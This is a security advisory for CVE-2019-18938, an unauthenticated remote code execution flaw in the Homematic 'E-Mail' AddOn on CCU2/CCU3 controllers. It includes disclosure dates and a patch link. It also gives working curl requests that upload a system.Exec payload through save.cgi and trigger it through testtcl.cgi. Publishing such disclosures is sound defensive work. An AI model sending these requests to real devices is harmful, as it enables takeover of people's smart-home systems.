---
layout: post
title:  "CVE-2019-18938 eQ-3 Homematic AddOn 'E-Mail' version 1.6.8.c and prior on CCU2 and CCU3 allows Remote Code Execution by unauthenticated attackers with access to the web interface by usage of the save.cgi script for payload upload and the testtcl.cgi script for its execution"
date:   2020-11-05 21:10:00 MET
author: 'psytester'
---



# Overview

- CVE: CVE-2019-18938
- Author: psytester
- Title: eQ-3 Homematic AddOn 'E-Mail' version 1.6.8.c and prior on CCU2 and CCU3 allows Remote Code Execution by unauthenticated attackers with access to the web interface by usage of the save.cgi script for payload upload and the testtcl.cgi script for its execution
- Vulnerability Type: CWE-284: Improper Access Control
-	CVSSv3 Base Score: 10.0
-	CVSSv3 Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
- Publishing Date: 14.11.2019
- Updated: 05.11.2020
- Vendor: eQ-3 AG for CCU Firmware is providing possibility to install AddOn software
- Product: Homematic CCU2 and CCU3
- Vendor eQ-3 contacted: 13.02.2019
- Vendor eQ-3 response on 11.04.2019 with "not responsible for AddOns"
- Addon itself:
  - Developer of 'E-Mail' AddOn contacted: 13.08.2019 as [issue #11](https://github.com/jens-maus/hm_email/issues/11)
  - Developer of 'E-Mail' AddOn confirmation: N.A.
  - 'E-Mail' AddOn patch: [Version 1.7.0](https://github.com/homematic-community/hm_email/releases/tag/1.7.0) released on 04.11.2020
  - Affected 'E-Mail' AddOn version: 1.6.8.c and prior

# Background

From [Github 'E-Mail' AddOn project page](https://github.com/jens-maus/hm_email):<br>
A HomeMatic/CCU Addon to send emails from a CCU system either by directly calling a script from the CCU WebUI programming interface or via CUxD devices being used within the CCU system.

From [eQ-3 vendor's website for CCU2](https://www.eq-3.com/products/homematic/control-units-and-gateways/homematic-central-control-unit-ccu2.html):<br>
HomeMatic Central Control Unit CCU2

Homematic Central Control Unit is the central element of your Homematic system, offering a whole range of control, monitoring and configuration options for all the Homematic devices in your installation<br>
[....]<br>

From [eQ-3 vendor's website for CCU3](https://www.homematic-ip.com/en/products/detail/smart-home-central-control-unit-ccu3.html):<br>
The Central Control Unit CCU3 is the central element for local control of the Homematic IP smart home system. It represents the next generation of our proven Homematic Central Control Units CCU1 and CCU2. Operation via the Central Control Unit CCU3 can be used alternatively to the Homematic IP Access Point. While the Access Point establishes the connection to the free Homematic IP cloud and enables operation of the smart home system via a smartphone app, the Central Control Unit CCU3 works locally via a browser-based web interface (WebUI). Thanks to local configuration and operation as well as the option to create direct device connections, reliable and fail-proof operation of the smart home system is guaranteed at all times â€“ even in the event of Internet failures.<br>
[....]<br>

# Issue Description

While analyzing the CCU web interface based on given page files in file system path /www, this is another Improper Access Control resulting into Remote Code Execution vulnerability located in 'E-Mail' AddOn, if it's installed. This vulnerability can be exploited by unauthenticated attackers with access to the web interface.<br>

The following HTTP requests in Web Browser illustrates the attack vectors:

1. Upload the payload to CCU embedded in system.Exec() commands or if also the popular CUxD AddOn is installed, another RCE is possible by abuse of the virtual CUxD'CMD_EXEC' device:<br>
```
curl -X POST -i 'http://1.2.3.4/addons/email/save.cgi?userScript' --data '
load tclrega.so
array set values [rega_script {
var x=system.Exec("sleep 4;");
var x=system.Exec("/bin/touch /tmp/testfile1;");
var x=dom.GetObject("CUxD.CUX2801001:1.CMD_EXEC").State("/bin/touch /tmp/testfile2");
}]'
```

2. Execute the payload by calling:<br>
```
curl -X GET -i 'http://1.2.3.4/addons/email/testtcl.cgi'
```

# CVE

[CVE-2019-18938](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18938)

# CVSSv3 Base Score

CVSSv3 Base Score: 10.0

CVSSv3 Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

# Credit

[psytester](https://psytester.github.io)

Not owning an original CCU2 or CCU3, but you want to analyze the CCU 'for free'?<br>
You can download<br>
[piVCCU](https://github.com/alexreinert/piVCCU) for running the original CCU3 Firmware in lxc container on RaspberryPi<br>
[RaspberryMatic](https://github.com/jens-maus/RaspberryMatic) for running the opensource OCCU based release on different boards<br>

# Disclaimer

The information provided is released "as is" without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information.
In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.

The contents of this advisory are copyright (c) 2019 by psytester and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.
